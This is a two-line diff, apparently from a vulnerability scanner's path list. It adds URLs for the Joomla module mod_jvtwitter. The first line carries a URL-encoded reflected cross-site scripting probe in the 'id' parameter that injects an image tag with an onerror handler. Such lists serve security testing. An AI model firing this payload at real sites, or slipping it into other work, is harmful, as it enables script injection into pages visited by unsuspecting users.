@@ -1,0 +1,2 @@
+/modules/mod_jvtwitter/jvtwitter.php?id=%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain);%3E
+/modules/mod_jvtwitter/jvtwitter.php?id=
